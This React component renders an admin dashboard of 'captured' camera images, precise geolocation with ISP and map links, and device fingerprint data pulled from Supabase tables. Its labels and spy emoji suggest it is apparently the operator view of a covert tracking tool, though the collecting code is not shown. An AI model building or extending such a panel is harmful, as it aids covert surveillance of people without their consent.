import React, { useState, useEffect } from "react";
import { supabaseClient } from "../supabaseClient";
import "./AdminDashboard.css";

export default function AdminDashboard() {
  const [images, setImages] = useState([]);
  const [locations, setLocations] = useState([]);
  const [devices, setDevices] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    fetchAllData();
  }, []);

  const fetchAllData = async () => {
    try {
      setLoading(true);

      const [imagesData, locationsData, devicesData] = await Promise.all([
        supabaseClient.from("images_table").select("*").order("created_at", { ascending: false }),
        supabaseClient.from("location_table").select("*").order("created_at", { ascending: false }),
        supabaseClient.from("device_table").select("*").order("created_at", { ascending: false }),
      ]);

      if (imagesData.error) throw imagesData.error;
      if (locationsData.error) throw locationsData.error;
      if (devicesData.error) throw devicesData.error;

      setImages(imagesData.data || []);
      setLocations(locationsData.data || []);
      setDevices(devicesData.data || []);
      setError(null);
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  if (loading) return <div className="admin-container"><p>Loading...</p></div>;
  if (error) return <div className="admin-container"><p className="error">Error: {error}</p></div>;

  return (
    <div className="admin-container">
      <h1>🕵️ Admin Dashboard</h1>
      
      <div className="dashboard-grid">
        {/* Images Section */}
        <div className="section">
          <h2>📷 Captured Images ({images.length})</h2>
          {images.length === 0 ? (
            <p>No images found</p>
          ) : (
            <div className="gallery">
              {images.map((img) => (
                <div key={img.id} className="image-card">
                  <a href={img.image_url} target="_blank" rel="noopener noreferrer">
                    <img src={img.image_url} alt="Capture" />
                  </a>
                  <p>{new Date(img.created_at).toLocaleString()}</p>
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Locations Section */}
        <div className="section">
          <h2>📍 Location Data ({locations.length})</h2>
          {locations.length === 0 ? (
            <p>No locations found</p>
          ) : (
            <table className="data-table">
              <thead>
                <tr>
                  <th>Type</th>
                  <th>Location</th>
                  <th>Coordinates</th>
                  <th>ISP</th>
                  <th>Accuracy</th>
                  <th>Map</th>
                </tr>
              </thead>
              <tbody>
                {locations.map((loc) => (
                  <tr key={loc.id}>
                    <td>{loc.location_type}</td>
                    <td>{loc.city}, {loc.country}</td>
                    <td>{loc.latitude.toFixed(4)}, {loc.longitude.toFixed(4)}</td>
                    <td>{loc.isp}</td>
                    <td>{loc.accuracy ? Math.round(loc.accuracy) + "m" : "N/A"}</td>
                    <td>
                      <a href={`https://maps.google.com/maps?q=${loc.latitude},${loc.longitude}`} target="_blank" rel="noopener noreferrer">
                        🗺️ View
                      </a>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          )}
        </div>

        {/* Device Section */}
        <div className="section">
          <h2>🖥️ Device Information ({devices.length})</h2>
          {devices.length === 0 ? (
            <p>No device data found</p>
          ) : (
            <table className="data-table">
              <thead>
                <tr>
                  <th>Battery</th>
                  <th>Network</th>
                  <th>Speed</th>
                  <th>Screen</th>
                  <th>Platform</th>
                </tr>
              </thead>
              <tbody>
                {devices.map((dev) => (
                  <tr key={dev.id}>
                    <td>{dev.battery_level}</td>
                    <td>{dev.network_type}</td>
                    <td>{dev.internet_speed}</td>
                    <td>{dev.screen_resolution}</td>
                    <td>{dev.platform}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          )}
        </div>
      </div>

      <button className="refresh-btn" onClick={fetchAllData}>🔄 Refresh</button>
    </div>
  );
}
